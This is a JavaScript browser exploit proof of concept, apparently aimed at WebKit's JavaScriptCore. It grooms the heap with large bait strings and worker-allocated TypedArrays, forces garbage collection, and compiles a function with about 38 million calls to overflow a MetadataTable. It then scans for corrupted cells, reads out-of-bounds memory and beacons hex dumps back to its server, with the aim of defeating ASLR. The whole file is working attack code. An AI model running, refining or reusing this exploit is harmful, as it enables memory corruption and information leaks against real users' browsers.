// p501 — MetadataTable overflow → TypedArray cell corruption → ASLR leak
//
// V466C PROVED: JSString cells in MarkedSpace get corrupted (.length=81400).
// But charCodeAt reads from StringImpl data (intact) → no pointer leak.
//
// KEY INSIGHT: JSArrayBufferView cells are ALSO in MarkedSpace.
// If sweep corrupts m_vector → TypedArray reads from arbitrary address.
// If m_vector = thunk addr (entry+24) → typedArray[0] reads CODE BYTES → ASLR break!
//
// Strategy: same bait-and-switch as V466C (20 baits, free, compile) but
// allocate TypedArray targets in worker alongside string targets.
// The sweep hits MarkedSpace cells regardless of what type they are.
//
// Entry layout (finishCreation, JIT=OFF):
//   +0-11:  PackedRawSentinelNode (zeroed)
//   +12-15: m_slowPathCount = 0
//   +16-23: m_doneLocation = 0 or code addr
//   +24-31: m_slowPathCallDestination = THUNK ADDR (8 bytes)
//   +32-63: union + WriteBarriers (mostly zeroed)
//   +64-67: bit fields
//   +68-71: m_bytecodeIndex = sequential index
//   +72-83: ArrayProfile (zeroed)
//   +84-87: padding
//   +88-111: ValueProfile (zeroed)
//
// Beacon prefix: V501-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V501-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT', navigator.userAgent);

  // ── WORKER CODE ──
  var workerCode = function() {
    var strTargets = [];
    var typedTargets = []; // {arr, buf, origLen}
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V501-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body || '');
      } catch(e) {}
    }
    function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Allocate string targets (proven to get corrupted)
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strTargets.push(s);
        }
        beacon('STR-TARGETS-' + strTargets.length);

        // Allocate TypedArray targets with various sizes
        // Different TypedArray sizes → different MarkedSpace cell blocks
        var sizes = [4, 8, 16, 32, 64];
        for (var si = 0; si < sizes.length; si++) {
          for (var ti = 0; ti < 20; ti++) {
            var buf = new ArrayBuffer(sizes[si] * 4);
            var arr = new Uint32Array(buf);
            // Fill with sentinel
            for (var f = 0; f < arr.length; f++) arr[f] = 0xDEAD0000 + (si * 100) + ti;
            typedTargets.push({arr: arr, buf: buf, origLen: sizes[si], sizeIdx: si, idx: ti});
          }
        }
        // Also allocate Float64Array targets (8 bytes per element = better for pointer reading)
        for (var fi = 0; fi < 30; fi++) {
          var fbuf = new ArrayBuffer(16 * 8); // 16 float64s = 128 bytes
          var farr = new Float64Array(fbuf);
          for (var ff = 0; ff < farr.length; ff++) farr[ff] = 1.5 + ff * 0.001;
          typedTargets.push({arr: farr, buf: fbuf, origLen: 16, sizeIdx: 5, idx: fi, isF64: true});
        }
        beacon('TYPED-TARGETS-' + typedTargets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // BUSY LOOP — poll strings AND typed arrays for corruption
        var found = false;
        var iterations = 0;
        var firstStr = -1, firstTyped = -1;

        while (!found && iterations < 3000000) {
          // Check strings
          for (var i = 0; i < strTargets.length; i++) {
            try {
              if (strTargets[i].length !== STR_LEN) {
                firstStr = i;
                found = true;
                break;
              }
            } catch(ex) { firstStr = i; found = true; break; }
          }
          // Check typed arrays
          if (!found) {
            for (var i = 0; i < typedTargets.length; i++) {
              try {
                var t = typedTargets[i];
                if (t.arr.length !== t.origLen) {
                  firstTyped = i;
                  found = true;
                  break;
                }
                // Also check if data changed (even if length same)
                if (t.arr[0] !== (0xDEAD0000 + (t.sizeIdx * 100) + t.idx) && !t.isF64) {
                  firstTyped = i;
                  found = true;
                  break;
                }
              } catch(ex) { firstTyped = i; found = true; break; }
            }
          }
          iterations++;
          if (iterations % 1000000 === 0) beacon('POLL-' + iterations);
        }

        beacon('DETECT', 'iters=' + iterations + ',str=' + firstStr + ',typed=' + firstTyped);

        // ── EXTRACTION: Strings ──
        var strCorrupt = 0;
        for (var i = 0; i < strTargets.length; i++) {
          var len = -1;
          try { len = strTargets[i].length; } catch(ex) { len = -2; }
          if (len === STR_LEN) continue;
          strCorrupt++;
          beacon('S-LEN-' + i, '' + len);

          // Read first 112 chars hex
          if (len > 0 && len < 200000) {
            var hex = '';
            var maxR = Math.min(len, 112);
            for (var c = 0; c < maxR; c++) {
              try {
                var ch = strTargets[i].charCodeAt(c);
                hex += ('0000' + ch.toString(16)).slice(-4);
              } catch(ex) { hex += 'XXXX'; break; }
            }
            beacon('S-HEX-' + i, hex.substring(0, 400));
          }
        }
        beacon('S-TOTAL', 'corrupt=' + strCorrupt + '/14');

        // ── EXTRACTION: TypedArrays ──
        var typedCorrupt = 0;
        for (var i = 0; i < typedTargets.length; i++) {
          var t = typedTargets[i];
          var arrLen = -1, dataChanged = false, readErr = false;

          try {
            arrLen = t.arr.length;
          } catch(ex) { arrLen = -2; readErr = true; }

          // Check for length corruption
          var lenChanged = (arrLen !== t.origLen);

          // Check data corruption (read first element)
          var d0 = 'err';
          try {
            if (t.isF64) {
              d0 = t.arr[0];
              var expected = 1.5;
              dataChanged = (d0 !== expected);
            } else {
              d0 = t.arr[0];
              var expected = 0xDEAD0000 + (t.sizeIdx * 100) + t.idx;
              dataChanged = (d0 !== expected);
            }
          } catch(ex) { d0 = 'throw'; dataChanged = true; readErr = true; }

          if (!lenChanged && !dataChanged) continue;
          typedCorrupt++;

          beacon('T-HIT-' + i, 'sz=' + t.sizeIdx + ',idx=' + t.idx +
            ',origLen=' + t.origLen + ',newLen=' + arrLen +
            ',d0=' + d0 + ',lenChg=' + lenChanged + ',dataChg=' + dataChanged +
            (t.isF64 ? ',f64' : '') + (readErr ? ',ERR' : ''));

          // If length changed, try reading OOB
          if (lenChanged && arrLen > t.origLen && arrLen < 100000) {
            beacon('T-OOB-' + i, 'newLen=' + arrLen + ',trying-read');
            try {
              // Read first 32 elements (or up to new length)
              var vals = [];
              var maxE = Math.min(arrLen, 32);
              for (var e = 0; e < maxE; e++) {
                var v = t.arr[e];
                if (t.isF64) {
                  // For Float64Array: convert to hex via DataView
                  var tb = new ArrayBuffer(8);
                  var tdv = new DataView(tb);
                  tdv.setFloat64(0, v);
                  vals.push(e + ':' + hex32(tdv.getUint32(0)) + hex32(tdv.getUint32(4)));
                } else {
                  vals.push(e + ':' + hex32(v));
                }
              }
              beacon('T-OOB-DATA-' + i, vals.join(','));
            } catch(ex) {
              beacon('T-OOB-ERR-' + i, ex.message);
            }
          }

          // If data changed (even with same length), report ALL elements
          if (dataChanged && !readErr) {
            try {
              var allVals = [];
              var maxD = Math.min(arrLen > 0 ? arrLen : t.origLen, 64);
              for (var d = 0; d < maxD; d++) {
                var v = t.arr[d];
                if (t.isF64) {
                  var tb2 = new ArrayBuffer(8);
                  var tdv2 = new DataView(tb2);
                  tdv2.setFloat64(0, v);
                  allVals.push(hex32(tdv2.getUint32(0)) + hex32(tdv2.getUint32(4)));
                } else {
                  allVals.push(hex32(v));
                }
              }
              beacon('T-DUMP-' + i, allVals.join(','));
            } catch(ex) {
              beacon('T-DUMP-ERR-' + i, ex.message);
            }
          }

          // Also try reading from the ArrayBuffer directly via DataView
          try {
            var dv = new DataView(t.buf);
            var hexDump = '';
            var maxB = Math.min(t.buf.byteLength, 128);
            for (var b = 0; b < maxB; b += 4) {
              hexDump += hex32(dv.getUint32(b, true));
            }
            beacon('T-RAW-' + i, hexDump);
          } catch(ex) {
            beacon('T-RAW-ERR-' + i, ex.message);
          }
        }
        beacon('T-TOTAL', 'corrupt=' + typedCorrupt + '/' + typedTargets.length);
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (marge heap) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD & COMPILE ──
  function phaseBuildOverflow() {
    B('BUILD-START');
    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v501fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v501ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v501ok ? 'OK' : 'FAIL'));
      if (!window.__v501fn) { B('NO-FN'); return; }

      // Start worker watching
      worker.postMessage({ cmd: 'watch' });

      // Call the function after 200ms delay
      setTimeout(function() {
        B('CALLING');
        try {
          window.__v501fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
